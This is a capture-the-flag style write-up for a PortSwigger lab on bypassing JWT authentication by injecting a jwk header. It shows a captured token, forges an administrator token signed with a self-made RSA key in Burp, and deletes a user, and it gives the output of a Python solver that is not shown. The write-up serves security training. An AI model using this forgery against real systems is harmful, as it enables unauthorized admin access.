# Lab: JWT authentication bypass via jwk header injection

### Instructions

This lab uses a JWT-based mechanism for handling sessions. The server supports the jwk parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source.

To solve the lab, modify and sign a JWT that gives you access to the admin panel at `/admin`, then delete the user carlos.

You can log in to your own account using the following credentials: `wiener:peter` 

### Solution

Logging in with the provided credentials a JWT is set:

```
eyJraWQiOiIzNzY1NWFhYy0wYTIxLTRhMDQtYmY0Mi05YzZiNWJkNTAwMDYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5NDU5NDI5NCwic3ViIjoid2llbmVyIn0.XeteSP1SGhcd5BvPUGz-bdJiHVET5GZNGUkOjlQ5b0kq6kjpsp01Kg2akoEoFmHdWKzaBRxK9xNPg3ju6i4EfJUYCOFLSiNsNoD66QwKflfXrXbpHcZzLQ__mjteaYE3QY2sIL_mn5WYm93XqCdwaFZrg9U8mOQNifp5rErrIdKfaeto9NL9PDz0V9Mg-NiXaannuoecbrymmSiyb2Qd8juNA2Mw6OkfIwd_oR-2dyuItzgODGwxxnyjnsQVrL2_-5EdUAnL8xn4-YhTtC7Pbuelh2vdLamIWUEW06rnSg9BuRFb3K5UKcsdNN9lMlxcmm4WeL2lQCbcZ95CVfoxeg
```

```json
{
  "kid": "37655aac-0a21-4a04-bf42-9c6b5bd50006",
  "alg": "RS256"
}
```

```json
{
  "iss": "portswigger",
  "exp": 1794594294,
  "sub": "wiener"
}
```

Capturing this in Burp, we can use JWT Editor to create a new RSA key.

We can then send the `/my-account` request to Repeater and click into the JWT Editor and first we need to set the user to administrator and second we need sign it with the created RSA key.

```json
{
    "iss": "portswigger",
    "exp": 1794594294,
    "sub": "administrator"
}
```

This generates a new token for us that we can send to `/admin` and delete the carlos user to solve the lab:

```
Users
wiener - Delete
carlos - Delete
```

### Python Solution

See `jwt_04.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/JWT_Attacks/JWT_04_jwt_authentication_bypass_via_jwk_header_injection]
└─$ python jwt_04.py https://0a2a00740460b23d80d7d586000400fd.web-security-academy.net/
[+] Logged in as wiener
[+] Forged session cookie with injected JWK, sub=administrator
[+] Deleted carlos
[+] Lab solved!
```